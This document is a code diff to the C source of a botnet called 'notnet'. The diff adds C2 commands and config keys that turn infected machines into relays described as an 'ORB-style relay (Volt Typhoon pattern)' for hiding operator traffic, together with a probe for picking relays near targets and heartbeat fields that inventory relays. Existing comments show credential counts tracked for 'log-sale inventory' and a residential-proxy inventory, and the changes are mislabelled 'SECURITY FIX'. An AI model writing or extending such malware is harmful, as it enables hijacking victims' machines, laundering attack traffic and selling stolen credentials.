@@ -6,6 +6,7 @@
 #include "spread.h"
 #include "payload.h"
 #include "proxy.h"
+#include "relay.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -2560,6 +2561,34 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
                 bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
                 applied = 1;
+            } else if (strcmp(key, "relay_enabled") == 0) {
+                /* SECURITY FIX (#91): ORB-style relay, strict 0/1
+                 * toggle. Takes effect immediately: 1 starts the relay
+                 * accept thread (token required), 0 stops it. */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->relay_enabled = (uint8_t)v;
+                    if (v == 1) {
+                        if (bot->relay_token[0] == '\0') {
+                            log_warn("CMD: relay_enabled=1 but no relay_token set");
+                        } else {
+                            relay_start(bot);
+                        }
+                    } else {
+                        relay_stop();
+                    }
+                    applied = 1;
+                }
+            } else if (strcmp(key, "relay_port") == 0) {
+                int v = atoi(value);
+                if (v >= 1 && v <= 65535) {
+                    bot->relay_port = (uint16_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "relay_token") == 0) {
+                strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
+                bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
+                applied = 1;
             }
             
             if (applied) {
@@ -2606,6 +2635,112 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 }
             } else {
                 protocol_send_response(bot, CMD_PROXY, "proxy: usage proxy on|off [port]");
+            }
+        } else if (strncmp(cmd, CMD_RELAY, strlen(CMD_RELAY)) == 0) {
+            /* SECURITY FIX (#91): ORB-style relay (Volt Typhoon pattern).
+             * Listener control: 'relay on [port]' / 'relay off' — starts
+             * or stops the token-authenticated relay accept thread
+             * (refused without a configured relay_token, like the proxy).
+             * Per-target path probe: 'relay <target> <port> [via
+             * <host>:<port>]' — connect to the target, either directly
+             * (baseline) or through the relay bot at via_host:via_port
+             * (single hop), and report the RTT. This is the building
+             * block for per-target relay selection: the operator probes
+             * candidate relays and prefers the one closest to the
+             * target. Multi-hop chains are future work. Not a DHT. */
+            char *args = cmd + strlen(CMD_RELAY);
+            while (*args == ' ' || *args == '\t') args++;
+            /* Guard "on"/"off" with a delimiter so a target host that
+             * merely starts with those letters (e.g. "onion.example")
+             * is not swallowed by the listener-control branch. */
+            int ctrl = 0;
+            if ((strncmp(args, "on", 2) == 0 &&
+                 (args[2] == ' ' || args[2] == '\t' || args[2] == '\0')) ||
+                (strncmp(args, "off", 3) == 0 &&
+                 (args[3] == ' ' || args[3] == '\t' || args[3] == '\0'))) {
+                ctrl = 1;
+            }
+            if (ctrl && strncmp(args, "on", 2) == 0) {
+                int port = 0;
+                char *rest = args + 2;
+                while (*rest == ' ' || *rest == '\t') rest++;
+                if (*rest != '\0') {
+                    int v = atoi(rest);
+                    if (v >= 1 && v <= 65535) port = v;
+                }
+                if (port && relay_is_running() && relay_get_port() != port) {
+                    relay_stop();   /* rebind on the requested port */
+                }
+                if (port) bot->relay_port = (uint16_t)port;
+                if (bot->relay_token[0] == '\0') {
+                    protocol_send_response(bot, CMD_RELAY, "relay on: no relay_token configured (set relay_token=)");
+                } else if (relay_start(bot) == 0) {
+                    log_info("CMD: relay on (port %d)", relay_get_port());
+                    char rbuf[64];
+                    snprintf(rbuf, sizeof(rbuf), "relay on: listening on %d", relay_get_port());
+                    protocol_send_response(bot, CMD_RELAY, rbuf);
+                } else {
+                    protocol_send_response(bot, CMD_RELAY, "relay on: failed to start (bind or thread)");
+                }
+            } else if (ctrl && strncmp(args, "off", 3) == 0) {
+                if (relay_is_running()) {
+                    relay_stop();
+                    protocol_send_response(bot, CMD_RELAY, "relay off: stopped");
+                } else {
+                    protocol_send_response(bot, CMD_RELAY, "relay off: not running");
+                }
+            } else {
+                /* Per-target path probe. Split at " via " first so the
+                 * target half is independent of the via syntax. */
+                char *via_arg = strstr(args, " via ");
+                char *via_host = NULL;
+                char via[256] = {0};
+                unsigned int via_port = 0;
+                if (via_arg) {
+                    *via_arg = '\0';    /* args now ends at " via " */
+                    via_host = via_arg + 5;
+                    while (*via_host == ' ' || *via_host == '\t') via_host++;
+                    if (sscanf(via_host, "%255[^:]:%u", via, &via_port) != 2 ||
+                        via_port < 1 || via_port > 65535) {
+                        protocol_send_response(bot, CMD_RELAY,
+                            "relay: bad via, use via <host>:<port>");
+                        continue;
+                    }
+                }
+                char host[256] = {0};
+                unsigned int port = 0;
+                if (sscanf(args, "%255s %u", host, &port) != 2 ||
+                    port < 1 || port > 65535) {
+                    protocol_send_response(bot, CMD_RELAY,
+                        "relay: usage relay <target> <port> [via <host>:<port>] | relay on [port] | relay off");
+                    continue;
+                }
+                long rtt = 0;
+                char rbuf[640];
+                if (relay_probe(bot, host, (uint16_t)port,
+                                via_host, (uint16_t)via_port, &rtt) == 0) {
+                    if (via_host) {
+                        snprintf(rbuf, sizeof(rbuf),
+                                 "relay: %s:%u reachable via %s:%u in %ldms",
+                                 host, port, via, via_port, rtt);
+                    } else {
+                        snprintf(rbuf, sizeof(rbuf),
+                                 "relay: %s:%u reachable directly in %ldms",
+                                 host, port, rtt);
+                    }
+                    log_info("CMD: %s", rbuf);
+                } else {
+                    if (via_host) {
+                        snprintf(rbuf, sizeof(rbuf),
+                                 "relay: %s:%u unreachable via %s:%u",
+                                 host, port, via, via_port);
+                    } else {
+                        snprintf(rbuf, sizeof(rbuf),
+                                 "relay: %s:%u unreachable", host, port);
+                    }
+                    log_info("CMD: %s", rbuf);
+                }
+                protocol_send_response(bot, CMD_RELAY, rbuf);
             }
         }
     }
@@ -2679,11 +2814,14 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     char heartbeat[1024];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
      * residential-proxy inventory (on/off + bound port).
-     * (#90): report cred_count so the C2 can track log-sale inventory. */
+     * (#90): report cred_count so the C2 can track log-sale inventory.
+     * (#91): report relay status so the C2 can build a relay inventory
+     * for per-target relay selection (ORB pattern). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
-        spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port());
+        spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
+        relay_is_running() ? 1 : 0, relay_get_port());
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -3389,6 +3527,22 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "proxy_token") == 0) {
             strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
             bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
+        } else if (strcmp(key, "relay_enabled") == 0) {
+            /* SECURITY FIX (#91): ORB-style relay toggle. The accept
+             * thread is started at boot (notnet.c) only when this is 1
+             * AND a relay_token is set. */
+            bot->relay_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "relay_port") == 0) {
+            int v = atoi(value);
+            if (v >= 1 && v <= 65535) {
+                bot->relay_port = (uint16_t)v;
+            } else {
+                log_warn("Config: relay_port=%d out of range (1-65535), keeping %u",
+                         v, bot->relay_port);
+            }
+        } else if (strcmp(key, "relay_token") == 0) {
+            strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
+            bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
         }
     }
     
